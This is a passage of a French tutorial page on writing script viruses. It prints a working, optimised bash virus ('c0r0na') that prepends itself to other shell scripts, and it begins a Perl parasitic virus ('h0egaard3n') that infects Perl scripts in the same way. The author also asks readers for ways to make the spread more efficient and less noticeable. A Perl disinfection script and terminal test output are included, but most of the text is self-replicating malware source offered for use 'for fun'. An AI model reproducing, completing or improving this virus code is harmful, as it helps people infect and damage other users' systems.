+[<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="90f5fde0f5e2a0e2d0fcf1e0e4ffe0">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> test]$ time -p ./test
+script de test
+real 0.17
+user 0.10
+sys 0.07
+</pre>
+<p>Ici c'est parfait mais il faut penser que l'on a infecté qu'un seul script. Lorsque que je fait le test pour infecter 9 fichiers c'est déjà un peu plus long:</p>
+<pre>
+[<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="d8bdb5a8bdaae8aa98b4b9a8acb7a8">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> test]$ time -p ./c0r0na
+real 0.48
+user 0.26
+sys 0.21
+</pre>
+<p>Pour ceux qui ne savent pas à quoi ces chiffres correspondent, un "man time" suffira. Il serait peut être bien de mettre un compteur d'infection pour pas ralentir les vielles machines au cas ou on tombe sur un dossier avec plein de shell script a infecter, une fois de plus à vous de voir le but que vous recherchez, moi c'est juste pour le fun.</p>
+<h3>III. Optimisation du virus:</h3>
+<p>Pour optimiser le code, on va choisir des noms de variables d'un seul caractère, et essayer de réduire le nombre de lignes:</p>
+<div class="bash" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #666666; font-style: italic;">#!/bin/bash</span><br/>
+<span style="color: #666666; font-style: italic;">#c0r0na</span><br/>
+<span style="color: #000000; font-weight: bold;">for</span> f <span style="color: #000000; font-weight: bold;">in</span> <span style="color: #000000; font-weight: bold;">*</span><br/>
+<span style="color: #000000; font-weight: bold;">do</span><br/>
+<span style="color: #000000; font-weight: bold;">if</span> <span style="color: black;">&#91;</span> <span style="color: #660033;">-f</span> <span style="color: #007800;">$f</span> <span style="color: #660033;">-a</span> <span style="color: #660033;">-w</span> <span style="color: #007800;">$f</span> <span style="color: black;">&#93;</span>;<span style="color: #000000; font-weight: bold;">then</span><br/>
+<span style="color: #000000; font-weight: bold;">if</span> <span style="color: #c20cb9; font-weight: bold;">file</span> <span style="color: #007800;">$f</span> <span style="color: #000000; font-weight: bold;">|</span> <span style="color: #c20cb9; font-weight: bold;">grep</span> Bourne-A <span style="color: #000000; font-weight: bold;">&gt;</span> <span style="color: #000000; font-weight: bold;">/</span>dev<span style="color: #000000; font-weight: bold;">/</span>null<br/>
+<span style="color: #000000; font-weight: bold;">then</span><br/>
+<span style="color: #c20cb9; font-weight: bold;">head</span> <span style="color: #660033;">-n</span> <span style="color: #000000;">2</span> <span style="color: #007800;">$f</span> <span style="color: #000000; font-weight: bold;">&gt;</span> .a<br/>
+<span style="color: #000000; font-weight: bold;">if</span> <span style="color: #c20cb9; font-weight: bold;">grep</span> c0r0na .a <span style="color: #000000; font-weight: bold;">&gt;</span> <span style="color: #000000; font-weight: bold;">/</span>dev<span style="color: #000000; font-weight: bold;">/</span>null<br/>
+<span style="color: #000000; font-weight: bold;">then</span><br/>
+<span style="color: #c20cb9; font-weight: bold;">rm</span> <span style="color: #660033;">-f</span> .a<br/>
+<span style="color: #000000; font-weight: bold;">else</span><br/>
+<span style="color: #c20cb9; font-weight: bold;">cat</span> <span style="color: #007800;">$f</span> <span style="color: #000000; font-weight: bold;">&gt;</span> .a<br/>
+<span style="color: #c20cb9; font-weight: bold;">head</span> <span style="color: #660033;">-n</span> <span style="color: #000000;">18</span> <span style="color: #007800;">$0</span> <span style="color: #000000; font-weight: bold;">&gt;</span> <span style="color: #007800;">$f</span><br/>
+<span style="color: #c20cb9; font-weight: bold;">cat</span> .a <span style="color: #000000; font-weight: bold;">&gt;&gt;</span> <span style="color: #007800;">$f</span><br/>
+<span style="color: #c20cb9; font-weight: bold;">rm</span> <span style="color: #660033;">-f</span> .a<br/>
+<span style="color: #000000; font-weight: bold;">fi</span>;<span style="color: #000000; font-weight: bold;">fi</span>;<span style="color: #000000; font-weight: bold;">fi</span><br/>
+<span style="color: #000000; font-weight: bold;">done</span><br/>
+&nbsp;</div>
+<p>Voila, il doit y avoir moyen de faire mieux mais je suis pas trés bon en programmation shell script. Ce virus étant fourni sous licence GPL vous avez le droit de le modifier :)) Le virus passe quand même de 441 octets a 239 octets et de 23 lignes a 18 lignes.</p>
+<p>Maintenant il reste un gros problème et je bloque pour le résoudre de manière efficasse : comment infecter les scripts qui ce trouve dans d'autre dossier? J'ai penser a faire une boucle du style:</p>
+<div class="bash" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #000000; font-weight: bold;">for</span> <span style="color: #c20cb9; font-weight: bold;">dir</span> <span style="color: #000000; font-weight: bold;">in</span> <span style="color: #000000; font-weight: bold;">*</span><br/>
+&nbsp;</div>
+<p>Puis rentrer dans chaque répertoire pour infecter les scripts et remonter aux niveau supérieur avec un "cd .." mais cela ralentira énormément la machine ce n'est pas du tout discret :(</p>
+<p>J'ai pas de solution adéquate ; il faudrait trouver un moyen pour faire une sorte de virus résident. Je pense qu'il doit exister une bonne solution mais je sais pas faire. Pour le moment ce virus n'est donc pas capable de véritablement se propager. Voila si quelqu'un détient la solution: mail <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="1a7f776a7f682a685a7737747f6e347b68787568747f6e3475687d">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script></p>
+<h3>IV. Désinfection</h3>
+<p>Pour le fun je vous propose un script de désinfection, simplifié au maximum, en perl:</p>
+<div class="perl" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: black; font-style: italic;">#!/usr/bin/perl</span><br/>
+<span style="color: #b1b100;">foreach</span> <span style="color: #0000ff;">$Fichier</span> <span style="color: black;">&#40;</span><span style="color: #339933;">&lt;*&gt;</span><span style="color: black;">&#41;</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">#recherche les fichiers</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">#du rep courant</span><br/>
+<span style="color: black;">&#123;</span><br/>
+&nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span><span style="color: black;">&#40;</span><span style="color: #339933;">-</span>f <span style="color: #0000ff;">$Fichier</span><span style="color: black;">&#41;</span> <span style="color: #339933;">&amp;&amp;</span> <span style="color: black;">&#40;</span><span style="color: #339933;">-</span>r <span style="color: #0000ff;">$Fichier</span><span style="color: black;">&#41;</span> <span style="color: #339933;">&amp;&amp;</span> <span style="color: black;">&#40;</span><span style="color: #339933;">-</span>w <span style="color: #0000ff;">$Fichier</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">#teste les droits</span><br/>
+&nbsp; <span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; <a style="color: #000060;" href="http://perldoc.perl.org/functions/open.html"><span style="color: #000066;">open</span></a><span style="color: black;">&#40;</span>File<span style="color: #339933;">,</span> <span style="color: #ff0000;">&quot;$Fichier&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">#ouvre le fichier</span><br/>
+<br/>
+&nbsp; &nbsp; <span style="color: #0000ff;">@Temp</span><span style="color: #339933;">=</span><span style="color: #009999;">&lt;File&gt;</span><span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">#le fichier est placé dans</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">#le tableau Temp</span><br/>
+&nbsp; &nbsp; <a style="color: #000060;" href="http://perldoc.perl.org/functions/close.html"><span style="color: #000066;">close</span></a><span style="color: black;">&#40;</span>File<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span><span style="color: #0000ff;">@Temp</span><span style="color: black;">&#91;</span><span style="color: #cc66cc;">1</span><span style="color: black;">&#93;</span> <span style="color: #339933;">=~</span> <span style="color: #ff0000;">&quot;c0r0na&quot;</span><span style="color: black;">&#41;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">#teste si fichier infecté</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">#par c0r0na</span><br/>
+&nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp;<a style="color: #000060;" href="http://perldoc.perl.org/functions/print.html"><span style="color: #000066;">print</span></a> <span style="color: #ff0000;">&quot;<span style="color: #000099; font-weight: bold;">\n</span>----&gt; Le fichier:&quot;</span><span style="color: #339933;">.</span><span style="color: #0000ff;">$Fichier</span><span style="color: #339933;">.</span><span style="color: #ff0000;">&quot; est infecté<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp;<a style="color: #000060;" href="http://perldoc.perl.org/functions/print.html"><span style="color: #000066;">print</span></a> <span style="color: #ff0000;">&quot;Désinfection de &quot;</span><span style="color: #339933;">.</span><span style="color: #0000ff;">$Fichier</span><span style="color: #339933;">.</span><span style="color: #ff0000;">&quot; en cours<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://perldoc.perl.org/functions/open.html"><span style="color: #000066;">open</span></a><span style="color: black;">&#40;</span>File<span style="color: #339933;">,</span> <span style="color: #ff0000;">&quot;&gt;$Fichier&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">#ouvre le fichier pour</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">#écrire dedans</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://perldoc.perl.org/functions/print.html"><span style="color: #000066;">print</span></a> File <span style="color: #0000ff;">@Temp</span><span style="color: black;">&#91;</span><span style="color: #cc66cc;">18</span> <span style="color: #339933;">..</span> <span style="color: #0000ff;">$#Temp</span><span style="color: black;">&#93;</span><span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">#récrit le fichier sans</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">#les 18 premières ligne</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://perldoc.perl.org/functions/close.html"><span style="color: #000066;">close</span></a><span style="color: black;">&#40;</span>File<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp;<a style="color: #000060;" href="http://perldoc.perl.org/functions/print.html"><span style="color: #000066;">print</span></a> <span style="color: #ff0000;">&quot;Désinfection réussi.<span style="color: #000099; font-weight: bold;">\n</span><span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
+&nbsp; <span style="color: black;">&#125;</span><br/>
+<span style="color: black;">&#125;</span><br/>
+&nbsp;</div>
+<p>Ce script est facilement configurable pour désinfecter les différents viriis de cet article.</p>
+<p>Testons ce script de désinfection:</p>
+<pre>
+[<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="caafa7baafb8fab88aa6abbabea5ba">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> test]$ cat test
+#!/bin/bash
+#c0r0na
+for f in *
+do
+if [ -f $f -a -w $f ];then
+if file $f | grep Bourne-A > /dev/null
+then
+head -n 2 $f > .a
+if grep c0r0na .a > /dev/null
+then
+rm -f .a
+else
+cat $f > .a
+head -n 18 $0 > $f
+cat .a >> $f
+rm -f .a
+fi;fi;fi
+done
+#!/bin/bash
+echo 'script de test'
+[<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="4f2a223f2a3d7f3d0f232e3f3b203f">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> test]$
+</pre>
+<p>C'est clair que test est infecté. On lance le script de désinfection.</p>
+<pre>
+[<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="fd98908d988fcd8fbd919c8d89928d">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> test]$ ./desinfection
+
+----&gt; Le fichier:test est infecte
+Désinfection de test en cours
+Désinfection réussi.
+
+----&gt; Le fichier:c0r0na est infecte
+Désinfection de c0r0na en cours
+Désinfection réussi.
+
+[<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="0e6b637e6b7c3e7c4e626f7e7a617e">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> test]$ cat test
+#!/bin/bash
+echo 'script de test'
+[<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="84e1e9f4e1f6b4f6c4e8e5f4f0ebf4">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> test]$
+</pre>
+<p>Parfait mon script est nettoyé.</p>
+<pre>
+[<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="3d58504d584f0d4f7d515c4d49524d">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> test2]$ cat c0r0na
+[<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="23464e5346511351634f4253574c53">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> test2]$
+</pre>
+<p>c0r0na était le script qui contenait la souche virale qui a infecté le script test ; son contenu à était supprimé lui aussi.</p>
+<h2>Partie 2: Perl script infection</h2>
+<p>Je ne vais pas reprendre toute la démarche faite pour l'infection des shell scripts dans cette partie. Le code présenté ici fonctionne de la même façon que précedemment.</p>
+<h3>I. Virus Parasite</h3>
+<p><strong>Le Code</strong></p>
+<div class="perl" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: black; font-style: italic;">#!/usr/bin/perl</span><br/>
+<span style="color: black; font-style: italic;">#h0egaard3n &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; #signature</span><br/>
+<a style="color: #000060;" href="http://perldoc.perl.org/functions/open.html"><span style="color: #000066;">open</span></a><span style="color: black;">&#40;</span>File<span style="color: #339933;">,</span><span style="color: #0000ff;">$0</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">#ouvre le fichier courant</span><br/>
+<span style="color: #0000ff;">@vx</span><span style="color: #339933;">=</span><span style="color: #009999;">&lt;File&gt;</span><span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">#place son contenu dans le tableau @vx</span><br/>
+<a style="color: #000060;" href="http://perldoc.perl.org/functions/close.html"><span style="color: #000066;">close</span></a><span style="color: black;">&#40;</span>File<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+<span style="color: #b1b100;">foreach</span> <span style="color: #0000ff;">$Fichier</span> <span style="color: black;">&#40;</span><span style="color: #339933;">&lt;*&gt;</span><span style="color: black;">&#41;</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">#recherche de fichiers</span><br/>
+<span style="color: black;">&#123;</span><br/>
+&nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span><span style="color: black;">&#40;</span><span style="color: #339933;">-</span>f <span style="color: #0000ff;">$Fichier</span><span style="color: black;">&#41;</span> <span style="color: #339933;">&amp;&amp;</span> <span style="color: black;">&#40;</span><span style="color: #339933;">-</span>r <span style="color: #0000ff;">$Fichier</span><span style="color: black;">&#41;</span> <span style="color: #339933;">&amp;&amp;</span> <span style="color: black;">&#40;</span><span style="color: #339933;">-</span>w <span style="color: #0000ff;">$Fichier</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span>&nbsp; <span style="color: black; font-style: italic;">#teste les droits</span><br/>
+&nbsp; <span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; <a style="color: #000060;" href="http://perldoc.perl.org/functions/open.html"><span style="color: #000066;">open</span></a><span style="color: black;">&#40;</span>File<span style="color: #339933;">,</span> <span style="color: #ff0000;">&quot;$Fichier&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">#ouvre le fichier trouvé</span><br/>
+&nbsp; &nbsp; <span style="color: #0000ff;">@Temp</span><span style="color: #339933;">=</span><span style="color: #009999;">&lt;File&gt;</span><span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">#place son contenu dans le tableau @Temp</span><br/>
+&nbsp; &nbsp; <a style="color: #000060;" href="http://perldoc.perl.org/functions/close.html"><span style="color: #000066;">close</span></a><span style="color: black;">&#40;</span>File<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span><span style="color: #0000ff;">@Temp</span><span style="color: black;">&#91;</span><span style="color: #cc66cc;">0</span><span style="color: black;">&#93;</span> <span style="color: #339933;">=~</span> <span style="color: #ff0000;">&quot;/perl&quot;</span><span style="color: black;">&#41;</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">#teste si le fichier est bien un script perl</span><br/>
+&nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span><span style="color: #0000ff;">@Temp</span><span style="color: black;">&#91;</span><span style="color: #cc66cc;">1</span><span style="color: black;">&#93;</span> <span style="color: #b1b100;">ne</span> <span style="color: #ff0000;">&quot;<span style="color: #000099; font-weight: bold;">\#</span>h0egaard3n<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: black;">&#41;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">#test qu'il n'est pas déjà infecté</span><br/>
+&nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://perldoc.perl.org/functions/open.html"><span style="color: #000066;">open</span></a><span style="color: black;">&#40;</span>File<span style="color: #339933;">,</span> <span style="color: #ff0000;">&quot;&gt;$Fichier&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">#rouvre le fichier pour y écrire</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://perldoc.perl.org/functions/print.html"><span style="color: #000066;">print</span></a> File <span style="color: #0000ff;">@vx</span><span style="color: black;">&#91;</span><span style="color: #cc66cc;">0</span> <span style="color: #339933;">..</span> <span style="color: #cc66cc;">23</span><span style="color: black;">&#93;</span><span style="color: #339933;">;</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">#on y met les 23 premières ligne</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://perldoc.perl.org/functions/print.html"><span style="color: #000066;">print</span></a> File <span style="color: #0000ff;">@Temp</span><span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">#on ajoute à la suite script original</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://perldoc.perl.org/functions/close.html"><span style="color: #000066;">close</span></a> <span style="color: black;">&#40;</span>File<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
